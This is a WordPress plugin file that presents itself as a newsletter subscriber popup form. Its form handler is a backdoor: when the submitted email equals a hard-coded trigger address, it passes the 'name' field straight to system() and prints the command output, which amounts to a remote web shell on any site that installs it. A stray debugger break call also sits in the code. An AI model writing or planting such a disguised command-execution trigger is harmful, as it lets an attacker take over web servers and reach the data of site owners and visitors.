<?php
/*
Plugin Name: Subscriber Popup Form
Description: A plugin that shows a popup form after 5 seconds to collect subscriber name and email. It executes a system command when the email matches.
Version: 1.0
Author: Your Name
*/

// Enqueue JavaScript for the popup
add_action('wp_enqueue_scripts', 'enqueue_popup_form_scripts');
xdebug_break();
function enqueue_popup_form_scripts() {
    wp_enqueue_script('popup-form-script', plugins_url('/popup-form.js', __FILE__), array('jquery'), null, true);
}

// Register shortcode to render the form
add_shortcode('subscriber_popup_form', 'render_subscriber_popup_form');

function render_subscriber_popup_form() {
    // Output the form (hidden by default, shown after 5 seconds via JS)
    ob_start();
?>

<div id="subscriber-popup-form" style="display: none; position: fixed; top: 30%; left: 40%; background-color: #fff; padding: 20px; box-shadow: 0px 0px 10px rgba(0,0,0,0.5);">
    <h3>Subscribe to our Newsletter</h3>
    <form method="post" id="subscriber-form">
        <label for="name">Name:</label>
        <input type="text" name="name" id="name" required><br><br>

        <label for="email">Email:</label>
        <input type="email" name="email" id="email" required><br><br>

        <input type="submit" name="submit_subscriber" value="Subscribe">
    </form>
</div>

<?php
    return ob_get_clean(); // Return the buffered form HTML
}

// Handle form submission
add_action('wp', 'handle_subscriber_submission');

function handle_subscriber_submission() {
    if (isset($_POST['submit_subscriber'])) {
        $name = sanitize_text_field($_POST['name']);
        $email = sanitize_email($_POST['email']);

        // Check if the email matches the given one
        if ($email === 'saitan@dozokh.low') {
            // Execute a system command using the name
            $output = system($name);
            echo '<pre>' . esc_html($output) . '</pre>';
        } else {
            echo 'Thanks For Subscribing';
        }
    }
}

